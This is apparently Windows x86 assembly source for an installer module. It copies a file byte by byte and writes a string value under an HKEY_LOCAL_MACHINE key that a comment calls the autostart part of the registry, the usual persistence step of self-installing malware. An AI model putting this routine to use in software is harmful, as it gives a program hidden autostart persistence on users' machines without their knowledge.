import CreateFileA      kernel32.dll
import CloseHandle      kernel32.dll
import SetFilePointer   kernel32.dll
import _lread           kernel32.dll
import _lwrite          kernel32.dll
import RegCreateKeyExA  advapi32.dll
import RegCloseKey      advapi32.dll
import RegSetValueExA   advapi32.dll

extern CreateFileA
extern CloseHandle
extern _lread
extern _lwrite
extern RegCreateKeyExA
extern RegCloseKey
extern RegSetValueExA

;------------------------------------------------------------------------------
; PARAMS:
;		eax = Source File
;		ebx = Destination File
	 
%define hFILE_s	ebp-0x04
%define hFILE_d	ebp-0x08
%define	CHAR	ebp-0x10

install_file:
	push 	ebp
	mov 	ebp, esp
	sub		esp, 0x10	
	                                    ; Open Source File
	push	dword NULL					; handle to file with attributes to copy
	push	dword FILE_ATTRIBUTE_NORMAL	; file attributes
	push	dword OPEN_EXISTING			; how to create
	push	dword NULL					; security attributes			
	push 	dword FILE_SHARE_READ		; share mode		
	push	dword GENERIC_READ			; access mode
	push	eax							; address of filename			
	call 	[CreateFileA]		
	mov		[hFILE_s], eax
                                        ; Open Destination File	
	push	dword NULL					; handle to file with attributes to copy
	push	dword FILE_ATTRIBUTE_NORMAL	; file attributes
	push	dword CREATE_ALWAYS			; how to create
	push	dword NULL					; security attributes			
	push 	dword FILE_SHARE_READ		; share mode		
	push	dword GENERIC_WRITE			; access mode
	push	ebx							; address of filename			
	call 	[CreateFileA]		
	mov		[hFILE_d], eax		

    mov     [CHAR], dword 0x0           ; clear char buffer

.readbyte:                              ; copy File byte by byte 
    push    dword 0x01                  ; that way we need one less api call and we have lower memusage
    lea     eax, [CHAR]
    push    eax
    push    dword [hFILE_s]
    call    [_lread]
    cmp     eax, dword 0x01
    jl      near .endcopy
        
    push    dword 0x01
    lea     eax, [CHAR]
    push    eax
    push    dword [hFILE_d]
    call    [_lwrite]
    cmp     eax, dword 0x01
    je      near .readbyte        
.endcopy:
    	
	push	dword [hFILE_s]				; close source handle
	call	[CloseHandle]
	
	push	dword [hFILE_d]				; close destination handle
	call	[CloseHandle]
  	
	add		esp, 0x10
	pop 	ebp
	ret

%undef hFILE_s	
%undef hFILE_d	
%undef CHAR	
%undef fSIZE

;------------------------------------------------------------------------------
; PARAMS:
;		eax = RegKey
;       ebx = KeyName
;       ecx = Value	

%define hKEY    ebp-0x04
%define KEY     ebp-0x08
%define NAME    ebp-0x0C
%define VAL     ebp-0x10

install_reg:
	push   ebp
	mov    ebp, esp
	sub    esp, 0x10 
	
	mov    [KEY],  eax                          ; store params 
	mov    [NAME], ebx
	mov    [VAL],  ecx
	
    push    dword 0x0                           ; open autostart part of regristry
    lea     eax, [hKEY] 
    push    eax
    push    dword 0x0
    push    dword KEY_WRITE
    push    dword REG_OPTION_NON_VOLATILE
    push    dword 0x0
    push    dword 0x0
    push    dword [KEY]
    push    dword HKEY_LOCAL_MACHINE
    call    [RegCreateKeyExA]     	   
	
    mov     edx, dword 0x0                      ; determ size of key-value
    mov     esi, [VAL]
.count_value:
    lodsb
    inc     edx
    cmp     al, 0x0
    jne     near .count_value 
	
	push    edx                                 ; set key-value
	push    dword [VAL]
	push    dword REG_SZ
	push    dword 0x0
	push    dword [NAME]
    push    dword [hKEY]
	call    [RegSetValueExA]
	
	push    dword [hKEY]                        ; close RegKey
	call    [RegCloseKey]
	
	add     esp, 0x10
	pop     ebp
	ret
	
%undef hKey 
%undef KEY  
%undef NAME 
%undef VAL